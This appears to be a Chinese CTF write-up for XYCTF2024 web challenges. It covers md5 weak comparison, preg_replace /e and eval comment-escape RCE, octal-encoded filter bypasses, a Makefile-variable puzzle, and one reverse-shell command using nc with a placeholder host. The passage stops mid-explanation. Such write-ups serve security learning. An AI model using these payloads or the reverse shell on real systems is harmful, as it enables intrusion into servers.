<h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><h3 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="#无字母RCE"></a>#无字母RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>

<p>这里需要我们传入的cmd符合白名单中的字符，否则就会执行die语句</p>
<p>无字母RCE</p>
<p>bashfuck的用法，需要配合$0环境变量去使用</p>
<ul>
<li><code>\$0</code> 是 <strong>Shell 环境中的一个特殊变量</strong>，代表 <strong>当前 Shell 或脚本的名称</strong>。</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/var/www/html# echo $<span class="number">0</span></span><br><span class="line"><span class="attribute">bash</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>&lt;&lt;&lt;</code></strong> → <strong>Here String</strong>（输入字符串作为标准输入）</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/var/www/html# <span class="variable">$0</span>&lt;&lt;&lt;<span class="string">&#x27;id&#x27;</span></span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure>

<p>这里可以看到id命令成功被执行</p>
<p>因为这里有白名单过滤，所以我们需要用数字编码去转换我们的命令</p>
<p>payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="variable">$0</span>&lt;&lt;&lt;$%27\154\163\040\057%27</span><br><span class="line">等价于</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ls /&#x27;</span> | /bin/bash</span><br><span class="line">\154\163\040\057是<span class="built_in">ls</span> /的八进制</span><br></pre></td></tr></table></figure>

<p>推荐文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/361101.html">https://www.freebuf.com/articles/system/361101.html</a></p>
<h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><h3 id="PHP特性"><a href="#PHP特性" class="headerlink" title="#PHP特性"></a>#PHP特性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">什么情况,这么基础的md5做不来</span><br></pre></td></tr></table></figure>

<p>用extract($_GET);代码可以实现变量覆盖，直接GET传入变量的值就行</p>
<p>先看第一层，就是简单的md5弱比较，用数组绕过或者强碰撞都行</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?val1<span class="comment">[]</span>=1&amp;val2<span class="comment">[]</span>=2</span><br></pre></td></tr></table></figure>

<p>再看第二层，需要变量在md5后的值弱等于初始值，也就是需要找个以0e开头的并且该值md5加密后也是0e开头</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?val1[]=<span class="number">1</span><span class="variable">&amp;val2</span>[]=<span class="number">2</span><span class="variable">&amp;md5</span>=<span class="number">0e215962017</span></span><br></pre></td></tr></table></figure>

<p>然后看第三层，需要$XY和$XYCTF的值符合弱相等，然后就是里面的md5比较，先算一下<code>XYCTF_550102591</code>在md5加密后的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;XYCTF_550102591&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//0e937920457786991080577371025051</span></span><br></pre></td></tr></table></figure>

<p>0e开头的，那还是强碰撞，但是想到这里能进行变量覆盖，那我们可以对$XYCTF的值进行修改，所以随便传入一个强碰撞相等的值就行</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?val1[]=<span class="number">1</span><span class="variable">&amp;val2</span>[]=<span class="number">2</span><span class="variable">&amp;md5</span>=<span class="number">0e215962017</span><span class="variable">&amp;</span>XY=QLTHNDT<span class="variable">&amp;</span>XYCTF=QLTHNDT</span><br></pre></td></tr></table></figure>

<p>然后拿到LLeeevvveeelll222.php文件</p>
<p>访问一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有点汗流浃背</span><br></pre></td></tr></table></figure>

<p>这里先需要满足第一层才能进行操作，既要a为数字也要a不包含数字,preg_match() 只能处理字符串，遇到数组时会返回 false，!false就是true，满足条件</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[]</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>第二层就是关于preg_replace在&#x2F;e模式下的rce了，这里三个参数都可控，就简单的多</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=/a/e<span class="variable">&amp;c</span>=a<span class="variable">&amp;b</span>=<span class="meta">system</span>(<span class="string">&#x27;ls /&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250403162908127.png" alt="image-20250403162908127"></p>
<h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><h3 id="md5图片碰撞"><a href="#md5图片碰撞" class="headerlink" title="#md5图片碰撞"></a>#md5图片碰撞</h3><p>需要上传两个图片，根据题目说的md5，估计是需要上传两个不一样的图片但是md5一样的</p>
<p>直接用md5碰撞生成工具(fastcoll)生成就行，也可以直接去网上找现成的图片</p>
<p><img src="/../image/achieve/202411/XYCTF2024/ship.jpg" alt="船舶图像"></p>
<p><img src="/../image/achieve/202411/XYCTF2024/plane.jpg" alt="平面图像"></p>
<p>这两张图片具有相同的 md5 哈希值：253dd04e87492e4fc3471de5e776bc3d</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250403164408218.png" alt="image-20250403164408218"></p>
<h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#man,,manba out</span></span><br></pre></td></tr></table></figure>

<p>这里限制了很多</p>
<ul>
<li>cmd的字符不能超过13个</li>
<li>过滤了很多命令函数和操作符</li>
</ul>
<p>另外在eval函数中有<code>#man</code>注释，我们需要避开这个坑，避免我们传入的代码被注释掉，然后在后面还有多余的数据</p>
<p>首先先试着能让我们的eval能执行</p>
<p>过注释符#</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;\n echo &#x27;1&#x27;;#&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>. <span class="variable">$a</span> .<span class="string">&quot;2323&quot;</span>);</span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>用换行符可以逃逸注释，但是这里过滤了<code>\</code></p>
<p>根据URL编码规则，我们用%0a去代替<code>\n</code>，本地测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>. <span class="variable">$a</span> .<span class="string">&quot;2323&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>传入a</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">a</span>=%<span class="number">0</span><span class="keyword">a</span> echo <span class="string">&#x27;1&#x27;</span>;%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>注意# 是 URL 的锚点标识符，这里需要对#进行编码成%23，否则会被认为是URL本身的分隔符，</p>
<p>根据**<code>\n</code> 和 <code>\r</code> 在 HTTP 请求中的特殊作用**，如果 <code>\n</code> 不经编码直接传入 <code>?a=\n123</code>，服务器或浏览器可能会错误地认为 <code>\n</code> 是 <strong>HTTP 请求结束符</strong>，导致参数被截断。所以我们的<code>\n</code>也是需要编码成URL编码才能起作用的</p>
<p>编码之后PHP后对参数a进行解码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?a</span>=\n echo <span class="string">&#x27;1&#x27;</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250403171617983.png" alt="image-20250403171617983"></p>
<p>绕过这两个的问题解决了，接下来就是如何绕过过滤进行rce了</p>
<p>如果上面两个是必须的，那么此时我们已经消耗掉了三个字符（注意，这里不是七个字符，因为后端PHP会进行解码，所以最后是三个字符），那么只能传入最多10个字符</p>
<p>这么多函数禁用了，这时候可以用反引号内联执行，在反引号中可以放入系统命令，可以用带参数输入的方式</p>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="variable">$_GET</span>[1]`</span></span><br></pre></td></tr></table></figure>

<p>刚好10个字符，然后可以传入1，但是这里对get的参数都有过滤，还不能换成post，限制的死死的，是要我们去绕过</p>
<p>不能写文件(&gt;被过滤)，不能操作文件（mv，cp被过滤），也不能看目录（ls，被过滤），还无法用通配符去匹配文件（?，*）被过滤</p>
<p>但是这些命令可以用单双引号去绕过，那么方法就很多了（注意这里是无回显的）</p>
<h3 id="方法1：cp复制flag"><a href="#方法1：cp复制flag" class="headerlink" title="方法1：cp复制flag"></a>方法1：cp复制flag</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a<span class="string">`$_GET[1]`</span>;%23&amp;<span class="number">1</span>=c<span class="string">&#x27;&#x27;</span>p /[@-z][@-z][@-z]g <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>

<p>虽然不能用<code>?</code>和<code>*</code>通配符，但是可以用<code>[]</code>去匹配单个字符，这里执行cp命令后访问1.txt就可以拿到flag了</p>
<h3 id="方法2：反弹shell"><a href="#方法2：反弹shell" class="headerlink" title="方法2：反弹shell"></a>方法2：反弹shell</h3><p>无回显的RCE，直接反弹shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [host] [port] -e /bi<span class="string">&#x27;&#x27;</span>n/sh</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250403175559834.png" alt="image-20250403175559834"></p>
<h3 id="方法3：数字编码绕过"><a href="#方法3：数字编码绕过" class="headerlink" title="方法3：数字编码绕过"></a>方法3：数字编码绕过</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%<span class="number">0</span>a`$_GET[<span class="number">1</span>]`;%<span class="number">23</span>&amp;<span class="number">1</span>=$<span class="string">&#x27;<span class="char escape_">\1</span>43<span class="char escape_">\1</span>60&#x27;</span> $<span class="string">&#x27;<span class="char escape_">\5</span>7<span class="char escape_">\1</span>46<span class="char escape_">\1</span>54<span class="char escape_">\1</span>41<span class="char escape_">\1</span>47&#x27;</span> <span class="number">1</span>.txt</span><br><span class="line"><span class="comment">//cp /flag的8进制</span></span><br><span class="line">然后访问<span class="number">1</span>.txt就行</span><br></pre></td></tr></table></figure>

<p>根据<strong>Bash 的 <code>$&#39;...&#39;</code> ANSI-C Quoting 机制</strong>，<code>$&#39;...&#39;</code> 会在 <strong>Shell 解析阶段</strong>（执行命令前）把 <code>\xxx</code>（八进制）转换成 <strong>对应的 ASCII 字符</strong>。所有 <strong><code>$&#39;\xxx&#39;</code> 拼接后</strong>，最终会合并为 <strong>可执行的 Shell 命令</strong></p>
<h2 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h2><p>hint：<code>Μακεϝ1LE&gt;1s&lt;S0&lt;ϜxxΚ1ηG_ξ2!@&lt;&gt;#&gt;%%#!$*&amp;^(!</code></p>
<p>才发现是和前面两个题一样的makefile</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[18:09:36]</span> Scanning:</span><br><span class="line"><span class="selector-attr">[18:10:33]</span> <span class="number">200</span> -    <span class="number">38</span>B - /hint<span class="selector-class">.php</span></span><br><span class="line"><span class="selector-attr">[18:10:35]</span> <span class="number">200</span> -    <span class="number">2</span>KB - /index.html</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;hint.php</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^[$|<span class="string">\(</span>|<span class="string">\)</span>|<span class="string">\@</span>|<span class="string">\[</span>|<span class="string">\]</span>|<span class="string">\&#123;</span>|<span class="string">\&#125;</span>|<span class="string">\&lt;</span>|<span class="string">\&gt;</span>|<span class="string">\-]+$/</span></span><br></pre></td></tr></table></figure>

<p>估计是正则匹配的表达式</p>
<p>先输出可用字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[$|\(|\)|\@|\[|\]|\&#123;|\&#125;|\&lt;|\&gt;|\-]+$/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//! &quot; # % &amp; &#x27; * + , . / 0 1 2 3 4 5 6 7 8 9 : ; = ? A B C D E F G H I J K L M N O P Q R S T U V W X Y Z \ ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z ~ </span></span><br></pre></td></tr></table></figure>

<p>一开始以为是有这么多字符可以用，后面才发现这个表达式是需要匹配的，而并非不能匹配的,也就是白名单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输出可用字符</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[$|\(|\)|\@|\[|\]|\&#123;|\&#125;|\&lt;|\&gt;|\-]+$/&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//$ ( ) - &lt; &gt; @ [ ] &#123; | &#125; </span></span><br></pre></td></tr></table></figure>

<p>学习一下关于Makefile中的$@, $^, $&lt; , $?, $%, $+, $*</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/dlf1769/article/details/78997967">Makefile中的$@, $^, $&lt; , $?, $%, $+, $*</a></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$@  表示目标文件</span><br><span class="line">$^  表示所有的依赖文件</span><br><span class="line">$&lt;  表示第一个依赖文件</span><br><span class="line">$?  表示比目标还要新的依赖文件列表</span><br><span class="line">$% 仅当目标是函数库文件中，表示规则中的目标成员名。例如，如果一个目标是“foo.a(bar.o)”，那么，“$%”就是“bar.o”，“$@”就是“foo.a”。如果目标不是函数库文件（Unix下是[.a]，Windows下是[.lib]），那么，其值为空。</span><br><span class="line"></span><br><span class="line">$+ 这个变量很像“$^”，也是所有依赖目标的集合。只是它不去除重复的依赖目标。</span><br><span class="line"></span><br><span class="line">$* 这个变量表示目标模式中“%”及其之前的部分。如果目标是“dir/a.foo.b”，并且目标的模式是“a.%.b”，那么，“$*”的值就是“dir/a.foo”。这个变量对于构造有关联的文件名是比较有较。如果目标中没有模式的定义，那么“$*”也就不能被推导出，但是，如果目标文件的后缀是make所识别的，那么“$*”就是除了后缀的那一部分。例如：如果目标是“foo.c”，因为“.c”是make所能识别的后缀名，所以，“$*”的值就是“foo”。这个特性是GNU make的，很有可能不兼容于其它版本的make，所以，你应该尽量避免使用“$*”，除非是在隐含规则或是静态模式中。如果目标中的后缀是make所不能识别的，那么“$*”就是空值。</span><br></pre></td></tr></table></figure>

<p>传入<code>$&lt;</code>，有回显&#x2F;flag，随后我们要读取，要用 &lt; 重定向符读取，用于从文件中读取内容</p>
<p>我们测试一下输入 &lt;$&lt; 回显了&lt;&#x2F;flag</p>
<p>随后我们要读取到一个地方，也没有什么地方能读取，只能读取到变量里那么我们就能构造出</p>
<p>payload</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(</span>&lt;<span class="variable">$&lt;</span>)</span><br></pre></td></tr></table></figure>

<p>但是还是读取不了，回显</p>
